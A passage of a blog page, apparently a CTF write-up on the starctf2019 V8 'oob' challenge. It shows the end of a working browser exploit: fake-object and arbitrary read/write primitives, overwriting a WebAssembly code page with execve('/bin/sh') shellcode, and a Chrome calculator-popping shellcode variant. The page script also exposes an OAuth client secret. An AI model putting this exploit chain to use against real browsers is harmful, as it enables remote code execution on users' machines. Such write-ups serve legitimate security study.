class="number">0</span>]=i2f(address+<span class="number">1</span>n);</span><br><span class="line">	f_array.oob(obj_array_type);</span><br><span class="line">	<span class="keyword">let</span> tmp_obj=f_array[<span class="number">0</span>];</span><br><span class="line">	f_array.oob(f_array_type);</span><br><span class="line">	<span class="keyword">return</span> tmp_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_obj_build=[</span><br><span class="line">	f_array_type,</span><br><span class="line">	i2f(<span class="number">0</span>n),</span><br><span class="line">	i2f(<span class="number">0x4141414141414141</span>n),</span><br><span class="line">	i2f(<span class="number">0x400000000</span>n),</span><br><span class="line">	<span class="number">1.1</span>,</span><br><span class="line">	<span class="number">2.2</span></span><br><span class="line">];</span><br><span class="line"><span class="comment">// when we only use 4 elements, </span></span><br><span class="line"><span class="comment">// something strange in objects layout</span></span><br><span class="line"></span><br><span class="line">fake_obj_addr=addressOf(fake_obj_build)<span class="number">-0x30</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] fake_obj_addr@"</span>+tos(fake_obj_addr));</span><br><span class="line">fake_obj=fakeObject(fake_obj_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">address</span>)</span>&#123;</span><br><span class="line">	fake_obj_build[<span class="number">2</span>]=i2f(address+<span class="number">1</span>n<span class="number">-0x10</span>n);</span><br><span class="line">	readin=f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">	<span class="comment">// console.log("[*] read: "+tos(readin));</span></span><br><span class="line">	<span class="keyword">return</span> readin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">address,value</span>)</span>&#123;</span><br><span class="line">	fake_obj_build[<span class="number">2</span>]=i2f(address+<span class="number">1</span>n<span class="number">-0x10</span>n);</span><br><span class="line">	fake_obj[<span class="number">0</span>]=i2f(value);</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"[*] write: "</span></span><br><span class="line">		+tos(address)</span><br><span class="line">		+<span class="string">" =&gt; "</span></span><br><span class="line">		+tos(value));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line">f=wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line">func_addr=addressOf(f);</span><br><span class="line">share_info_addr=func_addr+<span class="number">0x18</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"share_info_addr@"</span>+tos(share_info_addr));</span><br><span class="line">share_info=read64(share_info_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"share_info@"</span>+tos(share_info));</span><br><span class="line">data_addr=share_info+<span class="number">8</span>n<span class="number">-1</span>n;</span><br><span class="line">data=read64(data_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"data@"</span>+tos(data));</span><br><span class="line">instance_addr=data+<span class="number">0x10</span>n<span class="number">-1</span>n;</span><br><span class="line">instance=read64(instance_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"instance@"</span>+tos(instance));</span><br><span class="line">shellcode_addr=read64(instance+<span class="number">0x88</span>n<span class="number">-1</span>n);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"shellcode_addr@"</span>+tos(shellcode_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x2fbb485299583b6a</span>n,</span><br><span class="line">    <span class="number">0x5368732f6e69622f</span>n,</span><br><span class="line">    <span class="number">0x050f5e5457525f54</span>n</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buff=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">32</span>);</span><br><span class="line"><span class="keyword">var</span> dv=<span class="keyword">new</span> <span class="built_in">DataView</span>(buff);</span><br><span class="line"></span><br><span class="line">target_addr=read64(addressOf(dv)+<span class="number">0x18</span>n)<span class="number">-1</span>n+<span class="number">0x20</span>n;</span><br><span class="line"></span><br><span class="line">write64(target_addr,shellcode_addr);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;shellcode.length;i++)&#123;</span><br><span class="line">	dv.setFloat64(i*<span class="number">8</span>,i2f(shellcode[i]),<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
+
+<h3 id="chrome弹计算器"><a href="#chrome弹计算器" class="headerlink" title="chrome弹计算器"></a>chrome弹计算器</h3><p>修改一下上面的exp</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode=[<span class="number">0x90909090</span>,<span class="number">0x90909090</span>,<span class="number">0x782fb848</span>,<span class="number">0x636c6163</span>,<span class="number">0x48500000</span>,<span class="number">0x73752fb8</span>,<span class="number">0x69622f72</span>,<span class="number">0x8948506e</span>,<span class="number">0xc03148e7</span>,<span class="number">0x89485750</span>,<span class="number">0xd23148e6</span>,<span class="number">0x3ac0c748</span>,<span class="number">0x50000030</span>,<span class="number">0x4944b848</span>,<span class="number">0x414c5053</span>,<span class="number">0x48503d59</span>,<span class="number">0x3148e289</span>,<span class="number">0x485250c0</span>,<span class="number">0xc748e289</span>,<span class="number">0x00003bc0</span>,<span class="number">0x050f00</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;shellcode.length;i++)&#123;</span><br><span class="line">	<span class="comment">// dv.setFloat64(i*8,i2f(shellcode[i]),true);</span></span><br><span class="line">	dv.setUint32(i*<span class="number">4</span>,shellcode[i],<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>.<br><a href="https://github.com/sixstars/starctf2019/tree/master/pwn-OOB" target="_blank" rel="noopener">https://github.com/sixstars/starctf2019/tree/master/pwn-OOB</a></p>
+<p><a href="https://www.freebuf.com/vuls/203721.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/203721.html</a></p>
+<p><a href="https://blog.csdn.net/m0_38100569/article/details/99768746" target="_blank" rel="noopener">https://blog.csdn.net/m0_38100569/article/details/99768746</a></p>
+<p><a href="https://changochen.github.io/2019-04-29-starctf-2019.html" target="_blank" rel="noopener">https://changochen.github.io/2019-04-29-starctf-2019.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/browser/" rel="tag"># browser</a>
+          
+            <a href="/tags/v8/" rel="tag"># v8</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/09/bytectf2019_childjs/" rel="next" title="bytectf2019_childjs">
+                <i class="fa fa-chevron-left"></i> bytectf2019_childjs
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/11/26/redhad2019_offline_wp/" rel="prev" title="redhad2019_offline">
+                redhad2019_offline <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      
+        <div id="gitment-container"></div>
+      
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Q4n</p>
+              <p class="site-description motion-element" itemprop="description">划水狗没有明天！</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Q4n" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:907659303@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#starctf2019-oob"><span class="nav-number">1.</span> <span class="nav-text">starctf2019_oob</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#调试"><span class="nav-number">1.1.</span> <span class="nav-text">调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#V8-主要结构"><span class="nav-number">1.2.</span> <span class="nav-text">V8 主要结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.3.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">1.4.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#编写addressOf和fakeObject"><span class="nav-number">1.4.1.</span> <span class="nav-text">编写addressOf和fakeObject</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编写R-W原语"><span class="nav-number">1.4.2.</span> <span class="nav-text">编写R/W原语</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#从R-W到shell"><span class="nav-number">1.4.3.</span> <span class="nav-text">从R/W到shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#传统Linux-Pwn方式getshell"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">传统Linux Pwn方式getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用WebAssembly执行Shellcode"><span class="nav-number">1.4.3.2.</span> <span class="nav-text">利用WebAssembly执行Shellcode</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#chrome弹计算器"><span class="nav-number">1.4.4.</span> <span class="nav-text">chrome弹计算器</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">1.5.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Q4n</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+<!-- LOCAL: You can save these files to your site and update links -->
+    
+        
+        <link rel="stylesheet" href="https://aimingoo.github.io/gitmint/style/default.css">
+        <script src="https://aimingoo.github.io/gitmint/dist/gitmint.browser.js"></script>
+    
+<!-- END LOCAL -->
+
+    
+
+    
+      <script type="text/javascript">
+      function renderGitment(){
+        var gitment = new Gitmint({
+            id: '1574774075988', 
+            owner: 'Q4n',
+            repo: 'Q4n.github.io',
+            
+            lang: "" || navigator.language || navigator.systemLanguage || navigator.userLanguage,
+            
+            oauth: {
+            
+            
+                client_secret: 'd802fc1916bf445c7bab6c1718ba2134dabb7503',
+            
+                client_id: 'c76d7fa9e20aa4963c05'
+            }});
+        gitment.render('gitment-container');
+      }
+
+      
+      renderGitment();
+      
+      </script>
+    
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
